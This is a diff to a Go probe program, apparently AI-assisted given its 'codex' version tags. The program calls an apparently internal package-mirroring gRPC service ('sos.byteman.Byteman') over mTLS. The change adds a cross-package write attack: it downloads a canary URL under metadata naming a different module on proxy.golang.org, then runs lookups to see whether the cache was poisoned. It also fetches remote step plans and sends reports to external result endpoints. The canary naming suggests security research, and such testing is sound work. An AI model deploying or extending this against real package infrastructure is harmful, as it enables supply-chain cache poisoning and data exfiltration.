@@ -35,16 +35,21 @@ var rpcServiceHost string
 var rpcDialAddress string
 
 const (
-	protocolVersion = 1
-	moduleName      = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion    = "v0.0.35-codex"
-	maximumResult   = 256 * 1024
-	maximumBody     = 256 * 1024
-	requestTimeout  = 20 * time.Second
-	resultTimeout   = 30 * time.Second
-	planPollWindow  = 30 * time.Minute
-	maximumPlanBody = 4096
-	maximumPlanStep = 12
+	protocolVersion    = 1
+	moduleName         = "github.com/benr00t3d/go-cgo-pkgsite-probe"
+	probeVersion       = "v0.0.36-codex"
+	targetRegistry     = "https://proxy.golang.org"
+	targetModuleName   = "github.com/benr00t3d/go-byteman-crosswrite-canary"
+	targetVersion      = "v0.0.1"
+	targetCanarySHA256 = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
+	downloadSource     = "robert-owned-v036-cross-package-canary"
+	maximumResult      = 256 * 1024
+	maximumBody        = 256 * 1024
+	requestTimeout     = 20 * time.Second
+	resultTimeout      = 30 * time.Second
+	planPollWindow     = 30 * time.Minute
+	maximumPlanBody    = 4096
+	maximumPlanStep    = 12
 )
 
 var bucketNames = []string{
@@ -116,6 +121,7 @@ type bucketResult struct {
 }
 
 type grpcResult struct {
+	ID            string `json:"id,omitempty"`
 	Method        string `json:"method"`
 	HTTPStatus    int    `json:"http_status,omitempty"`
 	GRPCStatus    string `json:"grpc_status,omitempty"`
@@ -145,6 +151,8 @@ type probeReport struct {
 	Schema            string            `json:"schema"`
 	Module            string            `json:"module"`
 	Version           string            `json:"version"`
+	TargetModule      string            `json:"target_module,omitempty"`
+	TargetVersion     string            `json:"target_version,omitempty"`
 	StartedUTC        string            `json:"started_utc"`
 	FinishedUTC       string            `json:"finished_utc"`
 	Identity          identityResult    `json:"identity"`
@@ -182,16 +190,18 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v035-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v036-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
 	return probeReport{
-		Schema:     "owned-byteman-probe/v1",
-		Module:     moduleName,
-		Version:    probeVersion,
-		StartedUTC: started.UTC().Format(time.RFC3339Nano),
-		Identity:   identity,
+		Schema:        "owned-byteman-probe/v1",
+		Module:        moduleName,
+		Version:       probeVersion,
+		TargetModule:  targetModuleName,
+		TargetVersion: targetVersion,
+		StartedUTC:    started.UTC().Format(time.RFC3339Nano),
+		Identity:      identity,
 	}
 }
 
@@ -322,7 +332,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	fillCapslockContext(&initial)
 	initial.Reason = "waiting for a bounded Byteman plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v035-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v036-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -359,7 +369,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v035-codex-step-" + strconv.Itoa(cursor)
+		id := "v036-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -378,7 +388,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v035-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v036-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -470,35 +480,75 @@ func fillCapslockContext(report *probeReport) {
 func runBytemanProbe(report *probeReport, routeMode string) {
 	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
 	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
+	report.CanaryBodySHA256 = targetCanarySHA256
 	rpcClient, rpcEndpoint, err := newMTLSClient(routeMode)
 	if err != nil {
 		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
 		return
 	}
-	lookupRequest := appendStringField(nil, 2, bytemanCanaryURL)
-	baseline := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest)
-	report.Byteman = append(report.Byteman, baseline)
-	if baseline.HTTPStatus != http.StatusOK || baseline.GRPCStatus != "0" {
-		report.Reason = "Byteman Lookup did not authenticate cleanly; Download was not attempted"
+	urlLookupRequest := buildURLLookupRequest(bytemanCanaryURL)
+	coordinateLookupRequest := buildCoordinateLookupRequest()
+	baselineURL := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", urlLookupRequest)
+	baselineURL.ID = "baseline-url-lookup"
+	report.Byteman = append(report.Byteman, baselineURL)
+	baselineCoordinate := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", coordinateLookupRequest)
+	baselineCoordinate.ID = "baseline-coordinate-lookup"
+	report.Byteman = append(report.Byteman, baselineCoordinate)
+	if !grpcSucceeded(baselineURL) || !grpcSucceeded(baselineCoordinate) {
+		report.Reason = "both bounded Byteman baseline Lookups did not authenticate cleanly; Download was not attempted"
 		return
 	}
-	metadataMessage := []byte{}
-	metadataMessage = appendStringField(metadataMessage, 2, "https://proxy.golang.org")
-	metadataMessage = appendVarintField(metadataMessage, 3, 1) // GO_MODULE
-	metadataMessage = appendStringField(metadataMessage, 4, moduleName)
-	metadataMessage = appendVarintField(metadataMessage, 5, 1) // CONCRETE
-	metadataMessage = appendStringField(metadataMessage, 6, probeVersion)
-	downloadRequest := []byte{}
-	downloadRequest = appendStringField(downloadRequest, 1, bytemanCanaryURL)
-	downloadRequest = appendBytesField(downloadRequest, 4, metadataMessage)
-	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v035-codex-byteman-package-canary")
 	report.DownloadAttempted = true
-	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", downloadRequest)
+	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", buildTargetDownloadRequest(bytemanCanaryURL))
+	download.ID = "cross-package-download"
 	report.Byteman = append(report.Byteman, download)
-	if download.HTTPStatus == http.StatusOK && download.GRPCStatus == "0" {
+	if grpcSucceeded(download) {
 		time.Sleep(1500 * time.Millisecond)
-		report.Byteman = append(report.Byteman, callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest))
+		postURL := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", urlLookupRequest)
+		postURL.ID = "post-url-lookup"
+		report.Byteman = append(report.Byteman, postURL)
+		postCoordinate := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", coordinateLookupRequest)
+		postCoordinate.ID = "post-coordinate-lookup"
+		report.Byteman = append(report.Byteman, postCoordinate)
+		report.Reason = "bounded cross-package Download and post-write Lookups completed"
+	} else {
+		report.Reason = "bounded cross-package Download returned without success; post-write Lookups were not sent"
 	}
+}
+
+func grpcSucceeded(result grpcResult) bool {
+	return result.HTTPStatus == http.StatusOK && result.GRPCStatus == "0"
+}
+
+func buildURLLookupRequest(canaryURL string) []byte {
+	return appendStringField(nil, 2, canaryURL)
+}
+
+func buildCoordinateLookupRequest() []byte {
+	request := []byte{}
+	request = appendStringField(request, 7, targetRegistry)
+	request = appendStringField(request, 8, targetModuleName)
+	request = appendStringField(request, 9, targetVersion)
+	request = appendVarintField(request, 10, 1)
+	return request
+}
+
+func buildTargetMetadata() []byte {
+	metadata := []byte{}
+	metadata = appendStringField(metadata, 2, targetRegistry)
+	metadata = appendVarintField(metadata, 3, 1) // GO_MODULE
+	metadata = appendStringField(metadata, 4, targetModuleName)
+	metadata = appendVarintField(metadata, 5, 1) // CONCRETE
+	metadata = appendStringField(metadata, 6, targetVersion)
+	return metadata
+}
+
+func buildTargetDownloadRequest(canaryURL string) []byte {
+	request := []byte{}
+	request = appendStringField(request, 1, canaryURL)
+	request = appendBytesField(request, 4, buildTargetMetadata())
+	request = appendStringField(request, 6, downloadSource)
+	return request
 }
 
 type boundedBuffer struct {
